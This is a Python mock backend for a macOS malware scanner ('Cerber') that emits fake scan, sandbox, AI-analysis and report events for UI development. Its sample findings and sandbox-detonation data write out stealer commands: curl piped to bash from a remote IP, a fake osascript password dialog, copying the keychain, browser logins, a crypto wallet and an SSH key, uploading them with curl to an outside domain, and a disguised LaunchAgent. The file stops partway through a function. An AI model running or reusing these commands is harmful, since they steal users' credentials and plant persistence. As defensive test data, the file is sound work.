#!/usr/bin/env python3
"""Mock of `cerber.gui_backend` for developing Cerber.app (see app/PROTOCOL.md).

Accepts the same command line and prints the same JSON-Lines events with small sleeps, so the
SwiftUI app can be developed and demoed without the real engines. It never scans, never moves or
modifies a file: `scan` only lists names/sizes of the given paths (to show realistic "current file"
values), `quarantine` only pretends, and reports are throw-away files in the system temp dir.

Environment knobs (all optional):
  CERBER_MOCK_NOSLEEP=1    no sleeps (self-test / snapshots)
  CERBER_MOCK_SPEED=2.0    speed multiplier for the sleeps
  CERBER_MOCK_SYNTHETIC=1  never look at the real paths, use synthetic file names
  CERBER_MOCK_CLEAN=1      no findings at all (clean verdict; the Mega live network monitor raises no alarm)
  CERBER_MOCK_NETFAIL=1    Mega: the start network audit fails – summary.network then holds only `monitor`
  CERBER_MOCK_MISSING=1    `info` reports missing databases
  CERBER_MOCK_STOP_AT=0.45 stop (exit 0, no `done`) once the scan progress reaches this fraction
  CERBER_MOCK_STOP_BEHAVIOR=N  stop (exit 0, no `done`) in the behaviour step once N scripts have finished
                           (0 = while the first one is still running in the sandbox)
  CERBER_MOCK_AI=missing   the AI model is not installed until `ai-install` runs (per app launch; the app
                           starts it only when the user clicks "Pobierz model AI")
  CERBER_MOCK_AI=old       an older model (Granite) is installed; `info` offers the recommended one
  CERBER_MOCK_AI=fail      like `missing`, but `ai-install` fails at ~40 %
  CERBER_MOCK_AI=nollama   the model is installed but the llama-server engine is missing
  CERBER_MOCK_VIOLATION=1  the sandbox self-check fails (sandbox_violation + fatal error, exit 1)
  CERBER_MOCK_IPHONE=none  `iphone devices`: no device, no backup, no tools (=encrypted: the backup is encrypted)
"""
from __future__ import annotations

import argparse
from urllib.parse import urlparse
import datetime as _dt
import hashlib
import json
import os
import random
import re
import signal
import sys
import tempfile
import time

NOSLEEP = os.environ.get("CERBER_MOCK_NOSLEEP") == "1"
SPEED = max(0.05, float(os.environ.get("CERBER_MOCK_SPEED", "1") or 1))
SYNTHETIC = os.environ.get("CERBER_MOCK_SYNTHETIC") == "1"
CLEAN = os.environ.get("CERBER_MOCK_CLEAN") == "1"
STOP_AT = float(os.environ.get("CERBER_MOCK_STOP_AT", "0") or 0)
HOME = os.path.expanduser("~")
ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
REPORT_DIR = os.path.join(tempfile.gettempdir(), "cerber-mock-reports")
PATTERNS_TOTAL = 7215172
AI_MODE = os.environ.get("CERBER_MOCK_AI", "")
AI_FILE = "foundation-sec-1.1-8b-instruct-q4_k_m.gguf"
AI_SIZE = 4_920_780_160
# One marker per app launch (the app is our parent process), so `missing` resets on every launch.
AI_MARKER = os.path.join(tempfile.gettempdir(), f"cerber-mock-ai-installed-{os.getppid()}")

CANCELLED = False
STARTED = time.time()
rnd = random.Random(20261006)


def _on_sigint(_sig, _frm):
    global CANCELLED
    CANCELLED = True
    err("[mock] SIGINT – przerywam")


# --------------------------------------------------------------------------------------- helpers

def emit(ev: str, **kw) -> None:
    sys.stdout.write(json.dumps({"ev": ev, **kw}, ensure_ascii=False) + "\n")
    sys.stdout.flush()


def err(msg: str) -> None:
    sys.stderr.write(msg + "\n")
    sys.stderr.flush()


def log(msg: str) -> None:
    emit("log", msg=msg)
    err("[log] " + msg)


def nap(seconds: float) -> None:
    if NOSLEEP:
        return
    end = time.time() + seconds / SPEED
    while time.time() < end and not CANCELLED:
        time.sleep(min(0.05, max(0.0, end - time.time())))


def stage(sid: str, title: str) -> None:
    emit("stage", id=sid, title=title)
    err(f"[stage] {sid}: {title}")


def now() -> str:
    return _dt.datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def sha(s: str) -> str:
    return hashlib.sha256(s.encode()).hexdigest()


def ai_model_present() -> bool:
    if AI_MODE in ("missing", "fail"):
        return os.path.exists(AI_MARKER)
    return True


def ai_usable() -> bool:
    return ai_model_present() and AI_MODE != "nollama"


VERIFIED = ["zapis poza sandboksem zablokowany", "połączenia sieciowe zablokowane",
            "prośby o uprawnienia (TCC) zablokowane", "uruchamianie aplikacji przez LaunchServices zablokowane"]

READONLY_SANDBOX = {"isolation": ["brak dostępu do sieci (sandbox-exec: deny network*)",
                                  "system plików tylko do odczytu – zapis wyłącznie do katalogu raportów",
                                  "osobny proces z limitami pamięci i czasu"],
                    "verified": VERIFIED,
                    "mode": "readonly"}


def sandbox_selfcheck():
    """The sandbox tries forbidden things against itself before the scan; any success aborts the scan."""
    log("Samosprawdzenie sandboksa: zapis poza katalogiem, sieć, TCC, LaunchServices")
    nap(0.2)
    if os.environ.get("CERBER_MOCK_VIOLATION") == "1":
        emit("sandbox_violation", problems=["zapis do ~/Library/LaunchAgents NIE został zablokowany",
                                            "połączenie z 1.1.1.1:443 NIE zostało zablokowane"])
        emit("error", fatal=True, msg="Sandbox nie przeszedł samosprawdzenia – skan przerwany dla bezpieczeństwa.")
        sys.exit(1)
    for v in VERIFIED:
        log("✓ " + v)


def readonly_sandbox_stage():
    stage("sandbox", "Uruchamianie izolowanego sandboksa…")
    log("sandbox-exec: profil cerber-readonly (bez sieci, pliki tylko do odczytu)")
    sandbox_selfcheck()
    nap(0.3)


def det(name, engine, confidence, score, description, obj=None, pua=False):
    return {"name": name, "engine": engine, "confidence": confidence, "score": score,
            "description": description, "object": obj, "pua": pua}


def result(path, verdict, score, primary, size, ftype, detections, display=None, worst=None,
           can_q=True, ai=None):
    return {"path": path, "display_path": display or path.replace(HOME, "~"), "verdict": verdict,
            "score": score, "primary": primary, "size": size, "ftype": ftype, "sha256": sha(path),
            "worst_object": worst, "can_quarantine": can_q, "quarantined": None, "ai": ai,
            "detections": detections}


RANK = {"CLEAN": 0, "INFO": 1, "SUSPICIOUS": 2, "PUA": 3, "MALICIOUS": 4}


def worst(*verdicts):
    vs = [v for v in verdicts if v]
    return max(vs, key=lambda v: RANK.get(v, 0)) if vs else "CLEAN"


SEV2VERDICT = {"malicious": "MALICIOUS", "pua": "PUA", "suspicious": "SUSPICIOUS", "low": "INFO",
               "info": "INFO"}

# ----------------------------------------------------------------------------- synthetic content

def finding_eicar(base_dir, can_q=True, display=None, archive="eicar_test.zip"):
    p = os.path.join(base_dir, archive)
    return result(p, "MALICIOUS", 130, "ClamAV:Eicar-Test-Signature", 214, "zip", [
        det("Eicar-Test-Signature", "clamav", "CERTAIN", 100,
            "Plik testowy EICAR – nieszkodliwy wzorzec do sprawdzania antywirusów.",
            f"{archive}>>eicar.com"),
        det("EICAR_test_file", "hash", "CERTAIN", 100,
            "SHA-256 zgodny z plikiem EICAR (MalwareBazaar).", f"{archive}>>eicar.com"),
        det("SUSP_Eicar_String", "yara", "HIGH", 30, "Ciąg EICAR w pliku (YARA-Forge core).",
            f"{archive}>>eicar.com"),
    ], display=display, worst=f"{archive}>>eicar.com", can_q=can_q)


def finding_script(path, can_q=True, display=None, ai=False):
    return result(path, "SUSPICIOUS", 62, "Heurystyka:Shell.DownloadExecute", 2184, "shell", [
        det("Shell.DownloadExecute", "heuristic", "MEDIUM", 35,
            "Skrypt pobiera kod poleceniem curl i od razu przekazuje go do bash (curl … | bash).",
            None),
        det("Shell.Base64Payload", "heuristic", "MEDIUM", 15,
            "Ładunek zakodowany base64 dekodowany w locie (base64 -D | sh) – warstwa deobfuskacji 2.",
            os.path.basename(path) + ">>base64#1"),
        det("Shell.OsascriptPasswordPrompt", "heuristic", "LOW", 12,
            "Wywołanie osascript z oknem „display dialog … with hidden answer” – prośba o hasło.",
            None),
    ], display=display, can_q=can_q, ai={
        "mode": "verify", "model": AI_FILE,
        "choice": "amos", "family": "Atomic macOS Stealer (AMOS)", "family_id": "amos", "family_match": "similar",
        "category": "stealer", "verdict": "malicious", "confidence": 0.82, "agree": True, "grounded": 1.0,
        "points": 12, "points_raw": 12, "family_points": 3, "cap": 15,
        "accusations": [
            {"id": "A1", "name": "Shell.DownloadExecute", "engine": "heuristic", "strength": "MEDIUM", "score": 35,
             "verdict": "confirmed", "confidence": 0.9, "agree": True, "grounded": True, "points": 7,
             "quote": "curl -fsSL http://93.184.216.34/u | bash",
             "reason_pl": "Skrypt pobiera kod z adresu IP i od razu uruchamia go w bash, bez sprawdzenia."},
            {"id": "A2", "name": "Shell.Base64Payload", "engine": "heuristic", "strength": "MEDIUM", "score": 15,
             "verdict": "confirmed", "confidence": 0.8, "agree": True, "grounded": True, "points": 3,
             "quote": "base64 -D | sh", "reason_pl": "Ukryty ładunek base64 jest dekodowany i wykonywany w locie."},
            {"id": "A3", "name": "Shell.OsascriptPasswordPrompt", "engine": "heuristic", "strength": "LOW",
             "score": 12, "verdict": "unsure", "confidence": 0.5, "agree": False, "grounded": True, "points": 0,
             "quote": "display dialog", "reason_pl": "Okno dialogowe jest, ale z pokazanego fragmentu nie wynika, "
                                                     "że prosi o hasło systemowe."}],
        "reasons": ["curl … | bash", "display dialog … with hidden answer"],
        "options": [{"id": "amos", "name": "Atomic macOS Stealer (AMOS)", "cited": 0},
                    {"id": "banshee", "name": "Banshee Stealer", "cited": 0},
                    {"id": "other", "name": "Inna szkodliwa rodzina", "cited": 0},
                    {"id": "benign", "name": "Legalne oprogramowanie", "cited": 0}],
        "summary_pl": "Skrypt pobiera i uruchamia kod z zewnętrznego serwera, a potem prosi o hasło "
                      "administratora przez osascript – to typowy wzorzec stealera AMOS.",
    } if ai else None)


def finding_info_adhoc(path, display=None, can_q=True):
    return result(path, "INFO", 8, "macOS:AdHocSignature", 1_482_336, "macho", [
        det("macOS.AdHocSignature", "macos", "INFO", 5,
            "Plik wykonywalny ma tylko podpis ad-hoc (brak Developer ID i notaryzacji).", None),
        det("macOS.QuarantineXattr", "macos", "INFO", 3,
            "Pobrany z internetu (atrybut com.apple.quarantine), jeszcze nie uruchomiony.", None),
    ], display=display, can_q=can_q)


def finding_pua(path):
    return result(path, "PUA", 55, "YARA:MacOS_PUA_AdvancedMacCleaner", 38_211_584, "app", [
        det("MacOS_PUA_AdvancedMacCleaner", "yara", "HIGH", 45,
            "„Optymalizator” znany z agresywnych reklam i fałszywych alarmów (PUA/adware).",
            "Advanced Mac Cleaner.app/Contents/MacOS/Advanced Mac Cleaner", pua=True),
        det("TLSH:Adware.Pirrit", "fuzzy", "LOW", 10,
            "Podobny (TLSH 41) do próbek rodziny Pirrit – tylko dowód wspierający.",
            "Advanced Mac Cleaner.app/Contents/MacOS/Advanced Mac Cleaner"),
    ], worst="Advanced Mac Cleaner.app/Contents/MacOS/Advanced Mac Cleaner")


SYN_NAMES = [
    "Downloads/Raport_kwartalny_Q3.pdf", "Downloads/zdjecia_wakacje.zip", "Downloads/Zoom.pkg",
    "Documents/Umowy/umowa_najmu_2026.docx", "Documents/Projekty/cerber/README.md",
    "Desktop/Zrzut ekranu 2026-10-04 o 12.31.18.png", "Library/Caches/com.spotify.client/Data/a1.bnk",
    "Library/Application Support/Code/User/settings.json", "Music/Logic/Projekt.logicx",
    "Pictures/Photos Library.photoslibrary/database/Photos.sqlite",
    "Library/Containers/com.apple.mail/Data/Library/Mail Downloads/faktura.pdf",
    "Projects/web-app/node_modules/lodash/lodash.js", "Projects/web-app/dist/bundle.js",
    "Downloads/VLC-3.0.21-arm64.dmg", "Library/Application Support/Slack/Cache/Cache_Data/f_00a1c2",
]
SYS_NAMES = ["/Applications/Google Chrome.app/Contents/Frameworks/Google Chrome Framework.framework/"
             "Versions/129.0/Google Chrome Framework",
             "/Applications/Slack.app/Contents/Resources/app.asar",
             "/Applications/Visual Studio Code.app/Contents/Resources/app/out/main.js",
             "/opt/homebrew/Cellar/python@3.14/3.14.7/Frameworks/Python.framework/Versions/3.14/lib/libpython3.14.dylib",
             "/Library/Application Support/Microsoft/MAU2.0/Microsoft AutoUpdate.app",
             "/private/var/folders/xy/T/TemporaryItems/NSIRD_screencaptureui/tmp.png",
             "/usr/local/bin/node"]


def list_real(paths, cap=2500, budget_s=1.5):
    out = []
    t0 = time.time()
    for p in paths:
        p = os.path.abspath(os.path.expanduser(p))
        if os.path.isfile(p):
            try:
                out.append((p, os.lstat(p).st_size))
            except OSError:
                pass
            continue
        for d, dirs, files in os.walk(p, onerror=lambda e: None):
            dirs[:] = [x for x in dirs if not x.startswith(".")]
            for f in files:
                fp = os.path.join(d, f)
                try:
                    st = os.lstat(fp)
                except OSError:
                    continue
                out.append((fp, st.st_size))
                if len(out) >= cap or time.time() - t0 > budget_s:
                    return out
    return out


def synthetic_files(n, base=HOME, system=False):
    out = []
    for i in range(n):
        if system and i % 3 == 0:
            name = SYS_NAMES[i % len(SYS_NAMES)]
        else:
            name = os.path.join(base, SYN_NAMES[i % len(SYN_NAMES)])
        out.append((name, rnd.randint(2_000, 40_000_000)))
    return out


# ------------------------------------------------------------------------------------ reporting

def write_report(summary, rid):
    os.makedirs(REPORT_DIR, exist_ok=True)
    html_path = os.path.join(REPORT_DIR, rid + ".html")
    json_path = os.path.join(REPORT_DIR, rid + ".json")
    rows = "".join(f"<tr><td>{r['verdict']}</td><td>{r['display_path']}</td><td>{r['primary']}</td></tr>"
                   for r in summary.get("results", []))
    with open(html_path, "w", encoding="utf-8") as fh:
        fh.write(f"""<!doctype html><html lang="pl"><meta charset="utf-8"><title>Cerber – {summary['title']}</title>
<body style="font:15px -apple-system;margin:40px"><h1>Raport Cerbera (mock)</h1>
<p><b>{summary['title']}</b> – werdykt <b>{summary['verdict']}</b>, plików: {summary['files']}</p>
<table border=1 cellpadding=6 style="border-collapse:collapse">{rows}</table>
<p style="color:#888">To jest raport wygenerowany przez mock_backend.py – prawdziwy raport tworzy cerber.gui_backend.</p>
</body></html>""")
    with open(json_path, "w", encoding="utf-8") as fh:
        json.dump(summary, fh, ensure_ascii=False, indent=1)
    return html_path, json_path


def finish(mode, level, title, files, nbytes, results, *, seconds=None, sandbox=None, repo=None,
           environment=None, network=None, skipped=0, errors=None, url=None, cloud_only=0, cloud_fetch=None):
    results = sorted(results, key=lambda r: (-RANK.get(r["verdict"], 0), -r["score"]))
    counts = {k: 0 for k in RANK}
    for r in results:
        counts[r["verdict"]] = counts.get(r["verdict"], 0) + 1
    counts["CLEAN"] = max(0, files - sum(v for k, v in counts.items() if k != "CLEAN"))
    env_v = [SEV2VERDICT.get(f["severity"], "INFO") for f in (environment or {}).get("findings", [])]
    net_v = []
    if network:
        net_v = ["MALICIOUS" for c in network.get("connections", []) if c.get("ioc")]
        net_v += [{"malicious": "MALICIOUS", "suspicious": "SUSPICIOUS"}.get(r["risk"], "CLEAN")
                  for r in network.get("remote_access", [])]
    url_v = ["MALICIOUS"] if url and url.get("ioc") else []
    verdict = worst(*(r["verdict"] for r in results), *env_v, *net_v, *url_v)
    rid = "gui-" + _dt.datetime.now().strftime("%Y%m%d-%H%M%S") + f"-{mode}"
    summary = {
        "mode": mode, "level": level, "title": title,
        "started": _dt.datetime.fromtimestamp(STARTED).strftime("%Y-%m-%d %H:%M:%S"),
        "finished": now(), "seconds": round(seconds if seconds is not None else time.time() - STARTED, 1),
        "cancelled": CANCELLED, "verdict": verdict, "files": files, "bytes": nbytes,
        "objects": int(files * 3.4) + 17, "patterns_total": PATTERNS_TOTAL, "counts": counts,
        "results": results, "skipped": skipped, "errors": errors or [],
        "cloud_only": cloud_only, "cloud_fetch": cloud_fetch,
        "report_html": "", "report_json": "",
        "sandbox": sandbox, "repo": repo, "environment": environment, "network": network, "url": url,
    }
    stage("report", "Zapisywanie raportu…")
    summary["report_html"], summary["report_json"] = write_report(summary, rid)
    log(f"Raport zapisany: {summary['report_html']}")
    nap(0.3)
    emit("done", summary=summary)
    sys.exit(130 if CANCELLED else 0)


def cloud_stage(on_step=None):
    """Mega: risky iCloud-only files are downloaded, scanned and given back (cerber/cloudfetch.py)."""
    names = ["Setup.dmg", "install.sh", "faktura.pdf", "narzedzia.zip", "skrypt.py"]
    stage("cloud", "Pliki tylko w chmurze: pobieranie programów, skryptów, instalatorów i archiwów do skanu…")
    log("Chmura: pobieranie 40 ryzykownych plików (programy, skrypty, instalatory, archiwa, dokumenty z aktywną "
        "treścią) do skanu – potem wrócą tylko do chmury")
    for i in range(40):
        if CANCELLED:
            break
        emit("progress", stage="cloud", done=i, total=40, current=names[i % len(names)])
        if on_step:
            on_step(i / 40)
        nap(0.02)
    emit("progress", stage="cloud", done=40, total=40, current="")
    return {"candidates": 42, "fetched": 40, "bytes": 812_000_000, "evicted": 40, "kept": 0, "over_limit": 0,
            "too_big": 2, "failed": 0, "stalled": False, "dirs_listed": 3, "dirs_left": 0, "local": 0,
            "scanned": 40, "kinds": {"programy i skrypty": 12, "instalatory i archiwa": 20, "dokumenty": 8}}


def load_stage():
    stage("load", "Ładowanie baz sygnatur…")
    nap(0.4)
    log("Wczytano 428 287 sygnatur ClamAV (prefiltr Aho-Corasick: 1 104 512 kotwic)")
    nap(0.3)
    log("Wczytano 13 356 reguł YARA (XProtect, YARA-Forge core, własne paczki Cerbera)")
    nap(0.2)
    log("Indeks hashy: 4 012 345 plików, 2 700 000 sekcji PE; IOC: 125 000 wskaźników")
    nap(0.2)


def run_scan_loop(files, planned, total_files=None, bytes_scale=1.0, label_every=None, on_step=None):
    """files: list of (path, size); planned: {step: RESULT}; on_step(fraction) runs after every step.
    Returns (found, scanned_bytes, files_done)."""
    total = total_files or len(files)
    steps = 70
    found = []
    scanned_bytes = 0
    done = 0
    plan_points = sorted(planned)
    for step in range(1, steps + 1):
        if CANCELLED:
            log("Przerwano na żądanie użytkownika – zapisuję częściowe wyniki")
            break
        done = int(total * step / steps)
        idx = min(len(files) - 1, int(len(files) * step / steps)) if files else 0
        cur = files[idx][0] if files else ""
        scanned_bytes = int(sum(s for _, s in files[: idx + 1]) * bytes_scale) if files else 0
        while plan_points and plan_points[0] <= step:
            r = planned[plan_points.pop(0)]
            found.append(r)
            emit("finding", item=r)
            err(f"[finding] {r['verdict']} {r['path']}")
        rate = round(rnd.uniform(18.0, 96.0), 1)
        remaining = steps - step
        eta = int(remaining * (total / steps) / 140) + 1 if remaining else 0
        emit("progress", stage="scan", done=done, total=total, bytes=scanned_bytes, rate_mbs=rate,
             flagged=len(found), current=cur, eta_s=eta if step > 3 else None)
        if label_every and step % label_every == 0:
            log(f"Przeskanowano {done:,} z {total:,} plików".replace(",", " "))
        if on_step:
            on_step(step / steps)
        if STOP_AT and step / steps >= STOP_AT:
            sys.exit(0)
        nap(0.09)
    return found, scanned_bytes, done


def detonation_for(r):
    """What the mock's dropper script "did" in the sealed behaviour sandbox (no network, fake home with bait)."""
    name = os.path.basename(r["path"].split(">>")[-1])
    payload = "curl -s http://45.155.205.12/x | bash"
    behaviors = [
        {"id": "credential_prompt", "title": "Fałszywe okno z prośbą o hasło",
         "detail": "Skrypt wyświetla okno „Aktualizacja systemu wymaga hasła” przez osascript i zapisuje wpisane hasło.",
         "score": 50, "severity": "high",
         "evidence": ["osascript -e 'display dialog \"Aktualizacja systemu wymaga hasła\" default answer \"\" with hidden answer'",
                      "echo \"$pw\" > /tmp/.p"]},
        {"id": "persistence", "title": "Próba autostartu",
         "detail": "Skrypt próbuje zapisać LaunchAgent podszywający się pod Apple, żeby uruchamiać się przy każdym logowaniu.",
         "score": 45, "severity": "high",
         "evidence": ["cp /tmp/.u ~/Library/LaunchAgents/com.apple.softwareupdate.helper.plist",
                      "launchctl load -w ~/Library/LaunchAgents/com.apple.softwareupdate.helper.plist"]},
        {"id": "download_exec", "title": "Pobranie i uruchomienie kodu",
         "detail": "Skrypt pobiera zdalną treść i od razu ją wykonuje.", "score": 40, "severity": "medium",
         "evidence": [f"p=$(echo '{payload_b64()}' | base64 -d)", f"eval '{payload}'", "curl -s http://45.155.205.12/x",
                      "base64 -d"]},
        {"id": "credential_access", "title": "Dostęp do poświadczeń",
         "detail": "Skrypt sięga po hasła, klucze lub dane logowania (pęk kluczy, przeglądarki, SSH, portfele).",
         "score": 30, "severity": "medium",
         "evidence": ["cp ~/Library/Keychains/login.keychain-db /tmp/.k",
                      "cp ~/Library/Application Support/Google/Chrome/Default/Login Data /tmp/.c",
                      "zip -qr /tmp/.w.zip ~/Library/Application Support/Exodus/exodus.wallet",
                      "cat ~/.ssh/id_ed25519"]},
        {"id": "exfiltration", "title": "Wyprowadzanie danych",
         "detail": "Skrypt próbuje wysłać zebrane dane lub archiwa na zewnątrz.", "score": 35, "severity": "medium",
         "evidence": ["curl -s -F f=@/tmp/.k -F p=@/tmp/.p https://cdn-update-check.top/u"]},
        {"id": "process_launch", "title": "Uruchamianie narzędzi systemowych",
         "detail": "Skrypt próbuje uruchomić zewnętrzne narzędzia (zablokowane w sandboksie).", "score": 15, "severity": "low",
         "evidence": ["próba uruchomienia: osascript", "próba uruchomienia: launchctl"]},
    ]
    commands = [f"echo {payload_b64()}", "base64 -d", f"p='{payload}'", f"eval '{payload}'",
                "curl -s http://45.155.205.12/x", "bash",
                "osascript -e 'display dialog \"Aktualizacja systemu wymaga hasła\" default answer \"\" with hidden answer'",
                "cp ~/Library/Keychains/login.keychain-db /tmp/.k",
                "cp ~/Library/Application Support/Google/Chrome/Default/Login Data /tmp/.c",
                "zip -qr /tmp/.w.zip ~/Library/Application Support/Exodus/exodus.wallet",
                "curl -s -F f=@/tmp/.k -F p=@/tmp/.p https://cdn-update-check.top/u",
                "cp /tmp/.u ~/Library/LaunchAgents/com.apple.softwareupdate.helper.plist",
                "launchctl load -w ~/Library/LaunchAgents/com.apple.softwareupdate.helper.plist"]
    return {
        "ran": True, "kind": "bash", "seconds": 10.9, "timed_out": False, "verdict": "MALICIOUS", "score": 95,
        "behaviors": behaviors, "commands": commands,
        "network": [{"target": "45.155.205.12", "kind": "ip", "url": "http://45.155.205.12/x", "port": None,
                     "ioc": "ThreatFox: 45.155.205.12 – serwer dystrybucji AMOS Stealer (2026-09-30)"},
                    {"target": "cdn-update-check.top", "kind": "domain", "url": "https://cdn-update-check.top/u", "port": 443,
                     "ioc": None}],
        "files_read": ["~/Library/Keychains/login.keychain-db",
                       "~/Library/Application Support/Google/Chrome/Default/Login Data",
                       "~/Library/Application Support/Exodus/exodus.wallet/seed.seco", "~/.ssh/id_ed25519"],
        "files_written": ["/dev/tty", "~/Library/LaunchAgents/com.apple.softwareupdate.helper.plist", "/tmp/.k"],
        "stages": [{"source_preview": f"{payload}\nosascript -e 'display dialog \"Aktualizacja systemu wymaga hasła\" "
                                      "default answer \"\" with hidden answer'\ncp ~/Library/Keychains/login.keychain-db /tmp/.k\n"
                                      "curl -s -F f=@/tmp/.k -F p=@/tmp/.p https://cdn-update-check.top/u",
                    "detections": ["Heur:SHELL.PipeToShell", "Heur:SHELL.OsascriptPasswordPrompt",
                                   "Heur:SHELL.KeychainExfil", "Heur:SHELL.CredentialExfil"]}],
        "limitations": [f"{name} działał 10,9 s – kroki odłożone na później (np. po ponownym uruchomieniu) nie zostały "
                        "zaobserwowane.",
                        "Zdalny etap (http://45.155.205.12/x) nie został pobrany – sandbox nie ma internetu."],
    }


def payload_b64():
    import base64
    return base64.b64encode(b"curl -s http://45.155.205.12/x | bash").decode()


def behavior_stage(found, on_step=None):
    """Mock of the behaviour step: flagged shell scripts run for a few seconds in a sealed sandbox. What they try
    can only raise the verdict; the updated result is re-sent as `finding` (same path → updated in place)."""
    todo = [r for r in found if r.get("ftype") == "shell" and not r.get("detonation")]
    if not todo or CANCELLED:
        return
    n = len(todo)
    word = "podejrzany skrypt" if n == 1 else ("podejrzane skrypty" if 2 <= n % 10 <= 4 and not 12 <= n % 100 <= 14
                                               else "podejrzanych skryptów")
    stage("behavior", f"Analiza zachowania: {n} {word} w zamkniętym sandboksie…")
    stop_after = os.environ.get("CERBER_MOCK_STOP_BEHAVIOR")
    for i, r in enumerate(todo):
        if CANCELLED:
            break
        name = os.path.basename(r["path"].split(">>")[-1])
        emit("progress", stage="behavior", done=i, total=n, current=r["display_path"])
        log(f"Uruchamiam {name} (bash) w zamkniętym sandboksie: bez sieci, fałszywy katalog domowy z przynętami")
        if on_step:
            on_step(i / n)
        if stop_after == str(i):
            sys.exit(0)
        nap(1.2)
        dn = detonation_for(r)
        r["detonation"] = dn
        r["detections"] = r["detections"] + [
            det_("Behav:Script.CredentialPrompt", "HIGH", 50, "Fałszywe okno z prośbą o hasło (osascript, ukryta odpowiedź)."),
            det_("Behav:Script.Persistence", "HIGH", 45, "Próba zapisania LaunchAgenta w ~/Library/LaunchAgents."),
            det_("Behav:Script.DownloadExec", "MEDIUM", 40, "Pobranie i natychmiastowe uruchomienie kodu (curl | bash)."),
            det_("Behav:Script.Exfiltration", "MEDIUM", 35, "Próba wysłania pęku kluczy i hasła na zewnętrzny serwer."),
            det_("Behav:Script.CredentialAccess", "MEDIUM", 30, "Odczyt pęku kluczy, haseł Chrome i portfela Exodus (przynęty)."),
            det("Behav:Stage.SHELL.PipeToShell", "heuristic", "HIGH", 30,
                "Odkodowany ukryty etap przekazuje pobrany kod do powłoki.", name + ">>stage#1"),
        ]
        r["verdict"] = worst(r["verdict"], dn["verdict"])
        r["score"] = max(r["score"], dn["score"])
        emit("finding", item=r)
        log(f"{name}: {len(dn['behaviors'])} zachowań, w tym kradzież haseł – werdykt {dn['verdict']}")
        if on_step:
            on_step((i + 1) / n)
        if stop_after == str(i + 1):
            emit("progress", stage="behavior", done=i + 1, total=n,
                 current=todo[i + 1]["display_path"] if i + 1 < n else r["display_path"])
            sys.exit(0)
    emit("progress", stage="behavior", done=n, total=n)


def det_(name, confidence, score, description):
    return det(name, "detonate", confidence, score, description)


def ai_stage(results, on_step=None):
    stage("ai", "Analiza AI (lokalnie): ocena zarzutów wobec plików z szarej strefy…")
    log(f"Uruchamianie llama-server z modelem {AI_FILE} (CPU/Metal)")
    nap(0.8)
    grey = [r for r in results if r["verdict"] in ("SUSPICIOUS", "INFO")]
    log(f"Plików do oceny: {len(grey)}")
    if on_step:
        on_step(0.0)
    for i, r in enumerate(grey, 1):
        nap(0.4)
        log(f"AI ocenił: {os.path.basename(r['path'])}")
        if on_step:
            on_step(i / len(grey))


# ------------------------------------------------------------------------------------- commands

def cmd_info():
    missing = []
    if os.environ.get("CERBER_MOCK_MISSING") == "1":
        missing = ["db/clamav/daily.cvd", "db/feeds/threatfox.json"]
    nap(0.2)
    partial = int(os.environ.get("CERBER_MOCK_AI_PARTIAL", "0") or 0)
    emit("info", patterns_total=PATTERNS_TOTAL, clamav_signatures=428287, yara_rules=13356,
         file_hashes=4012345, section_hashes=2700000, ioc_indicators=125000,
         db_built="2026-09-29 14:16",
         ai_model=(None if not ai_model_present() else "granite-4.0-h-tiny-Q4_K_M.gguf"
                   if AI_MODE == "old" and not os.path.exists(AI_MARKER) else AI_FILE), missing=missing,
         ai_installable=True, ai_model_size=AI_SIZE, ai_model_recommended=AI_FILE,
         ai_upgrade_available=AI_MODE == "old" and not os.path.exists(AI_MARKER),
         ai_download_partial=0 if ai_model_present() else partial,
         llama_server=AI_MODE != "nollama")


def cmd_ai_install():
    server = None if AI_MODE == "nollama" else "/opt/homebrew/bin/llama-server"
    path = os.path.join(HOME, "Library/Application Support/Cerber/models", AI_FILE)
    if ai_model_present() and not (AI_MODE == "old" and not os.path.exists(AI_MARKER)):
        emit("ai_installed", model=AI_FILE, path=path, llama_server=server)
        sys.exit(0)
    stage("download", f"Pobieranie modelu AI (Foundation-Sec 1.1 8B, {AI_SIZE / 1e9:.1f} GB)…".replace(".", ",", 1))
    start = int(os.environ.get("CERBER_MOCK_AI_PARTIAL", "0") or 0)
    if start:
        log(f"Wznawianie pobierania od {start} B")
    log("Źródło: huggingface.co/fdtn-ai/Foundation-Sec-1.1-8B-Instruct-Q4_K_M-GGUF (weryfikacja SHA-256 po pobraniu)")
    steps = 40
    for k in range(1, steps + 1):
        if CANCELLED:
            emit("error", fatal=True, msg="Instalacja modelu AI: przerwano – pobieranie zostanie wznowione")
            sys.exit(130)
        done = start + int((AI_SIZE - start) * k / steps)
        emit("progress", stage="download", bytes=done, total=AI_SIZE)
        if AI_MODE == "fail" and k == int(steps * 0.4):
            emit("error", fatal=True, msg="Instalacja modelu AI: zerwane połączenie z huggingface.co (HTTP 503)")
            sys.exit(1)
        nap(0.25)
    log("Sprawdzanie SHA-256… zgodne")
    nap(0.3)
    with open(AI_MARKER, "w") as fh:
        fh.write("ok")
    if server is None:
        emit("error", fatal=False, msg="Model pobrany, ale brakuje silnika llama-server – zainstaluj go: brew install llama.cpp")
    emit("ai_installed", model=AI_FILE, path=path, llama_server=server)


def cmd_history():
    os.makedirs(REPORT_DIR, exist_ok=True)
    items = [
        ("gui-20261006-101500", "scan", "Pobrane", "MALICIOUS", "2026-10-06 10:15:00", 1204),
        ("gui-20261006-081200", "url", "bit.ly · malware-faktura", "MALICIOUS", "2026-10-06 08:12:00", 5),
        ("gui-20261005-221012", "laptop", "Laptop – Mega", "SUSPICIOUS", "2026-10-05 22:10:12", 1284551),
        ("gui-20261004-183344", "github", "github.com/psf/requests", "CLEAN", "2026-10-04 18:33:44", 238),
        ("gui-20261003-091502", "huggingface", "huggingface.co/acme-ai/llama-tiny-chat", "PUA",
         "2026-10-03 09:15:02", 14),
        ("gui-20261001-120000", "sandbox", "instalator_programu.zip", "INFO", "2026-10-01 12:00:00", 341),
        ("gui-20260930-075959", "laptop", "Laptop – Szybki", "CLEAN", "2026-09-30 07:59:59", 48213),
    ]
    out = []
    for rid, mode, title, verdict, started, files in items:
        html_path = os.path.join(REPORT_DIR, rid + ".html")
        json_path = os.path.join(REPORT_DIR, rid + ".json")
        if not os.path.exists(html_path):
            with open(html_path, "w", encoding="utf-8") as fh:
                fh.write(f"<!doctype html><meta charset=utf-8><title>{title}</title>"
                         f"<h1>{title}</h1><p>Werdykt: {verdict} · plików: {files}</p>"
                         f"<p>(raport przykładowy z mock_backend.py)</p>")
